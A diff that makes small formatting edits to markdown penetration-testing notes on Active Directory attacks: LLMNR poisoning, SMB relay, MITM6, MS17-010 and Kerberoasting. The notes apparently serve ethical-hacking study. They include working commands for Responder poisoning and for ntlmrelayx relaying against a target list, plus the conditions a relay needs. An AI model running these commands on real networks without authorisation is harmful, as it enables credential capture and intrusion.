@@ -2,14 +2,14 @@
 **2 Relay Attacks** \
 **3 MITM6** \
 **4 MS17-010** \
-**5 Kerberoasting** \
+**5 Kerberoasting**
 
 ---
 
 **1. LLMNR (link local multicasting name resolution:: basically DNS) Poisoning:**
 
 - needs traffic - ideal before nmap/nessus scans
-- responder:
+- Responder:
 
   `python /usr/share/responder/Responder.py -L eth0 -rdwv`
 
@@ -22,9 +22,8 @@
 **2. SMB Relay attacks:**
 
 - Requirements: SMB signing must be disabled, relayed user creds must be admin on machine, && network sharing enabled
-- setup ntlmrelay::  ![ntlmrelay.py](https://github.com/crcirq32/Notes/blob/main/Ethical/Screenshots/ntlmrelay_py.png)
-  a) Find machines w/ smb enabled: Nessus or Nmap:
-
+- setup ntlmrelay:: \  ![ntlmrelay.py](https://github.com/crcirq32/Notes/blob/main/Ethical/Screenshots/ntlmrelay_py.png)
+  a) Find machines w/ smb enabled: Nessus or Nmap: \
 
 `/opt/impacket/examples/$ python3ntlmrelayx.py -tf targets.txt -smb2support (-i) #python3 -m pip install . ## -i interactive`
 
@@ -49,7 +48,7 @@ c. `xdg-open /opt/impacket/examples/lootme/domain_users_by_group.html`
 
 ---
 
-4. MS17-010 \
+4. MS17-010 
 
 ---
 
